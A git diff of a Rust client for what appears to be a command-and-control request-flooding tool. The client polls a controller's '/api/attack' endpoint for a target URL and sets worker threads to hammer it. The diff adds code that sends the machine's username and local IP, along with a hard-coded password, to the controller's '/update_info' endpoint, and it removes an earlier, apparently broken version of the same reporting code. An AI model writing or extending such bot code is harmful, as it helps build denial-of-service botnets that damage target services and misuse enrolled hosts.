@@ -1,9 +1,11 @@
 use dashmap::DashMap;
 use serde_json;
-use shared_mutex::{SharedMutex, SharedMutexWriteGuard};
+use shared_mutex::SharedMutex;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Condvar};
-use serde_json::json;
+
+use whoami::*;
+use local_ip_addr::get_local_ip_address;
 
 struct Client {
     host_address: String,
@@ -14,8 +16,8 @@ struct Client {
 
 // Client methods
 impl Client {
-    // Constructor
     fn new(host: String) -> Client {
+        let client = reqwest::blocking::Client::new();
         let thread_count = match std::thread::available_parallelism() {
             Ok(tp) => tp.get(),
             Err(_) => {
@@ -23,7 +25,7 @@ impl Client {
                 1
             }
         };
-        let mut cl = Client {
+        let cl = Client {
             host_address: host,
             attack_data: Arc::new((SharedMutex::new(String::new()), Condvar::new())),
             results: Arc::new(DashMap::with_capacity(thread_count)),
@@ -32,6 +34,8 @@ impl Client {
         for i in 0..thread_count {
             cl.results.insert(i as u32, vec![]);
         }
+        let creds =  vec![format!("{}@{}", username(), get_local_ip_address().unwrap()), String::from("Somepswd")];
+        client.post(format!("{}/update_info", cl.host_address)).json(&creds).send().unwrap();
         cl
     }
 
@@ -41,7 +45,8 @@ impl Client {
     }
 
     // Checks if the server can attack, if it can, it notifies the workers
-    fn can_attack<'a>(&self) {
+    fn can_attack(&self) {
+        let (lock, cv) = &*self.attack_data.clone();
         let url = self.host_address.as_str();
         let req = reqwest::blocking::get(format!("{}/api/attack", url))
             .unwrap()
@@ -53,9 +58,27 @@ impl Client {
             .strip_suffix("\"}")
             .unwrap()
             .to_string();
-        let mut attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1].to_string();
+        let attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1].to_string();
         let url_str = attack_address_url.as_str().clone().to_owned();
-        let (lock, cv) = &*self.attack_data.clone();
+        let update = reqwest::blocking::get(format!("{}/currently_updating", url))
+            .unwrap()
+            .json::<String>()
+            .unwrap()
+            .strip_prefix("{\"")
+            .unwrap()
+            .to_string()
+            .strip_suffix("\"}")
+            .unwrap()
+            .to_string();
+        let upd = update.split("\":\"").collect::<Vec<&str>>();
+        let update_info = String::from(upd[1]);
+        if !update_info.is_empty(){
+            self.exit_signal.store(true, Ordering::Relaxed);
+            cv.notify_all();
+            return;
+
+        }
+
         let mut wlock = lock.write().unwrap();
         *wlock = url_str;
         drop(wlock);
@@ -95,15 +118,8 @@ impl Client {
         stop_signal: Arc<AtomicBool>,
     ) {
         let client = reqwest::blocking::Client::new();
-        let ip_username = format!("{}@{}", std::net::IpAddr, whoami::username());
-        let password = whoami::password().unwrap_or_default();
-        client.post("http://localhost:8080/update_info")
-            .body(json!(ip_username, password))
-            .send()
-            .unwrap();
         let (lock, cv) = &*attack_data;
         let delay = std::time::Duration::from_micros(15);
-        // Infinite loop, stoppable by signal
         while !stop_signal.load(Ordering::Relaxed) {
             std::thread::sleep(delay);
             let mut pair = lock.write().unwrap();
@@ -121,10 +137,10 @@ impl Client {
 
 fn run() {
     let cl = Client::new(String::from("http://localhost:8080"));
-    let currently_updating = Arc::new(AtomicBool::new(false));
     let attack_data = cl.attack_data.clone();
     let results = cl.results.clone();
-    let exit_signal = cl.exit_signal.clone(); // Add exit signal clone
+    let exit_signal = cl.exit_signal.clone();
+    let handle_signal = cl.exit_signal.clone();
     let mut worker_threads: Vec<std::thread::JoinHandle<()>> = Vec::new();
     let thread_count = match std::thread::available_parallelism() {
         Ok(tp) => tp.get(),
@@ -152,7 +168,7 @@ fn run() {
         let map = &*armap;
         let mut total_request_time: u128 = 0;
         let mut request_count = 0;
-        loop {
+        while !handle_signal.load(Ordering::Relaxed) {
             std::thread::sleep(time);
             let mut request_body_vec = Vec::new();
             for el in map.iter() {
@@ -183,15 +199,12 @@ fn run() {
             }
         }
     });
-    // Checks if the server can attack
     loop {
         cl.can_attack();
         if exit_signal.load(Ordering::Relaxed) {
             break;
         }
     }
-    // stop_signal..store(true, Ordering::Relaxed);
-    // Waits for the thread to finish
     exit_signal.store(true, Ordering::Relaxed); // Set exit signal to stop the threads
     handl.join().unwrap();
     for thread in worker_threads {
